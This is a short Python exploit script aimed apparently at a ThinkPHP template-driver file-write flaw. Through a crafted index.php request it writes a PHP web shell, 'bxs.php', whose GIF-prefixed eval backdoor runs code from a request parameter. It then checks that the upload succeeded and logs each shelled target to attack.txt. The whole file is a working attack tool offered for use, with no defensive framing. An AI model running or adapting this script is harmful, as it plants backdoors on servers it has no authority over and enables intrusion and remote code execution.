import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check(url):
    print(f"[info] {url}-invoke_func_code_exec漏洞")
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Content-Length": "319",
        "Connection": "close"
    }

    try:
        urljia = r"/index.php?s=index/\think\template\driver\file/write&cacheFile=bxs.php&content=Gif89a%3C%3Fphp+class+GYUJ9g7l+%7B+public+function+__construct%28%24H7zX3%29%7B+%40eval%28%22%2F*Z7Cc4urWV9*%2F%22.%24H7zX3.%22%2F*Z7Cc4urWV9*%2F%22%29%3B+%7D%7Dnew+GYUJ9g7l%28%24_REQUEST%5B%274k4d666%27%5D%29%3B%3F%3E"
        urlt = url
        url = url + urljia
        requests.get(url=f'{url}',headers=headers,verify=False,timeout=5)
        res = requests.post(url=f"{url}/bxs.php",headers=headers,verify=False,timeout=5)
        if "Gif89a" in res.text :
            print(f"---->[invoke_func_code_exec] 上传成功，请检查：{url}/bxs.php")
            with open("attack.txt",'a') as attack:
                attack.write(f"shell:{urlt}/bxs.php,invoke_func_code_exec\n")
            
    except:
        print(f"[error] {urlt}-invoke_func_code_exec漏洞")
    pass